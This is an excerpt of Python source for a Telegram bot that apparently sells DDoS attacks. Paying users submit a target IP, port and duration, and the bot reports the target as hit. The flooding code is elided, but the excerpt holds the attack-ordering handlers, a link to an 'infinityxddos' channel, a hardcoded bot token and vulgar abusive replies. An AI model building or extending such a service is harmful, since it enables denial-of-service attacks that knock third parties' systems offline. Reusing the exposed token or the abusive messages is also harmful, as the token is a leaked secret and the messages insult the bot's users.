...
TOKEN = '7452388550:AAGt2TBtTAVyEO3orWXJQbzzm_BsttzD7r8'
...
def attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "𝐁𝐨𝐬𝐝𝐢𝐤𝐞😂 𝐝𝐦 @todo_v8 🗿 𝐚𝐧𝐝 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬🔥.")
            return
        ...
        bot.send_message(chat_id, "𝐄𝐧𝐭𝐞𝐫 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄 𝐈𝐍[𝙨𝙚𝙘𝙤𝙣𝙙𝙨] 😒.")
...
def attack_command(message):
    ...
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*𝐁𝐨𝐬𝐝𝐢𝐤𝐞😂 𝐃𝐦 @todo_v8 🗿 𝐚𝐧𝐝 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬🔥.*", parse_mode='Markdown')
            return
        ...
        bot.send_message(chat_id, "*𝐄𝐍𝐓𝐄𝐑 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄[𝙨𝙚𝙘𝙤𝙣𝙙𝙨] 😒.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*𝐅𝐮𝐜𝐤𝐞𝐝 𝐮𝐩 💥\n\n𝒉𝑜𝑠𝑡: {target_ip}\n𝑝𝑜𝑟𝑡: {target_port}\n𝑇𝑖𝑚𝑒: {duration}*", parse_mode='Markdown')
    except Exception as e:
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/infinityxddos/17708*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*𝐓𝐄𝐑𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*𝐔𝐫 𝐝𝐚𝐝𝐝𝐲 @todo_v8 😒*", parse_mode='Markdown')
    else:
